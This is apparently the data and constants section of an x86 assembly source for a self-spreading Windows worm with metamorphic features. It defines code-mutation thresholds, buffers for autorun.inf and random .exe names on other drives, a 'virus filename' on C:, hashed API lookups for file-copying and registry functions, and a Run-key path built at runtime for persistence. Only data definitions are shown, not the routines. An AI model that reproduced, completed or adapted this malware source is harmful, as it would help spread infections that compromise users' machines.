; ############################################################################
; ############################################################################
; #####
; ##### CONSTANT DEFINITION
; #####

  AminoStartInMap	EQU 0x400+(StAmino-start)
  AlphabethStartInMap	EQU 0x400+(StartAlphabeth-start)

  ; One out of n bytes will be changed: 7 > n > (2^32 - 1)


  VarThreshold1 EQU 5417	  ; 87.5%

  xchgThreshold1 EQU 39155	  ; 25.0%

  InsertThreshold1 EQU 0x05	  ; 20.0%

; #####
; ##### CONSTANT DEFINITION
; #####
; ############################################################################
; ############################################################################




; ############################################################################
; ############################################################################
; #####
; #####   DATA
; #####

DataOffset:
	Place4Life	dd 0x0
	RandomNumber	dd 0x0

			db 0x0
	   Driveletter1 db 0x0
			db 0x0, 0x0	 ; buffer for ":\"

	RandomFileName: times 8 db 0x0	 ; buffer for random filename
	   rndext:	times 4 db 0x0	 ; .exe
			db 0x0

			db 0x0
	   Driveletter2 db 0x0
			db 0x0, 0x0	; buffer for ":\"

	   autoruninf:	times 11 db 0x0
			db 0x0


			db 0x0
	   Driveletter3 db 0x0, 0x0, 0x0     ; buffer for "C:\"

	   virusname:	times 8 db 0x0	     ; virus filename at C:
	   virext:	times 4 db 0x0	     ; .exe
			db 0x0

	FileHandle	dd 0x0
	MapHandle	dd 0x0
	MapPointer	dd 0x0
	FileSize	dd 0x0

	stDLLkernel32: times 12 db 0x0
		      db 0x0
	stDLLadvapi32: times 12 db 0x0
		      db 0x0

	hDLLlibrary32  dd 0x0

	hAddressTable dd 0x0
	hNamePointerTable dd 0x0
	hOrdinalTable dd 0x0

	APINumber dd 0x0

   APINumberKernel EQU 12
   APINumberAdvapi EQU 2


	hMagicNumberPointer dd 0x0
   APIMagicNumbers:
	mCloseHandle dd 0x0F05
	mCopyFileA   dd 0x03E6
	mCreateFileA dd 0x03FF
	mCreateFileMappingA dd 0x06F3
;        mCreateProcessA   dd 0x00EC
	mGetDriveType	  dd 0x0B2F
	mGetCommandLineA  dd 0x0D14
	mGetFileSize	  dd 0x0705
	mWriteFile	  dd 0x0AC8
	mGetTickCount	  dd 0x060C
	mMapViewOfFile	  dd 0x0DEA
;        mSleep            dd 0x006F
	mUnmapViewOfFile  dd 0x00F4
	mSetErrorMode	  dd 0x0923

   APIMagicNumbersReg:
	mRegCreateKey	  dd 0x0731
	mRegSetValueEx	  dd 0x0AE6
;        mRegCloseKey      dd 0x05F4



	hAddressePointer dd 0x0
   APIAddresses:
	hCloseHandle dd 0x0
	hCopyFileA   dd 0x0
	hCreateFileA dd 0x0
	hCreateFileMappingA dd 0x0
;        hCreateProcessA   dd 0x0
	hGetDriveType	  dd 0x0
	hGetCommandLineA  dd 0x0
	hGetFileSize	  dd 0x0
	hWriteFile	  dd 0x0
	hGetTickCount	  dd 0x0
	hMapViewOfFile	  dd 0x0
;        hSleep            dd 0x0
	hUnmapViewOfFile  dd 0x0
	hSetErrorMode	  dd 0x0

   APIAddressesReg:
	hRegCreateKey	  dd 0x0
	hRegSetValueEx	  dd 0x0
;        hRegCloseKey      dd 0x0



	xchgBuffer dd 0x0

	InsertA    dd 0x0
	Insertx    dd 0x0
	Inserty    dd 0x0
	InsertWrt  dd 0x0

	stSubKey: times 46 db 0x0 ; SOFTWARE\Microsoft\Windows\CurrentVersion\Run
				  ; will be created at runtime

	hRegKey dd 0x0

	AutoStartContentStart: times 51 db 0x0
	AutoStartContentEnd:


StartUp_struct:
  StartUp_struct_cb		 dd 0
  StartUp_struct_lpReserved	 dd 0
  StartUp_struct_lpDesktop	 dd 0
  StartUp_struct_lpTitle	 dd 0
  StartUp_struct_dwX		 dd 0
  StartUp_struct_dwY		 dd 0
  StartUp_struct_dwXSize	 dd 0
  StartUp_struct_dwYSize	 dd 0
  StartUp_struct_dwXCountChars	 dd 0
  StartUp_struct_dwYCountChars	 dd 0
  StartUp_struct_dwFillAttribute dd 0
  StartUp_struct_dwFlags	 dd 0
  StartUp_struct_wShowWindow	 dw 0
  StartUp_struct_cbReserved2	 dw 0
  StartUp_struct_lpReserved2	 dd 0
  StartUp_struct_hStdInput	 dd 0
  StartUp_struct_hStdOutput	 dd 0
  StartUp_struct_hStdError	 dd 0


ProcessInfo_Struct:
  PROCESS_INFORMATION_hProcess	  dd 0
  PROCESS_INFORMATION_hThread	  dd 0
  PROCESS_INFORMATION_dwProcessId dd 0
  PROCESS_INFORMATION_dwThreadId  dd 0


; #####
; #####   DATA
; #####
; ############################################################################
; ############################################################################
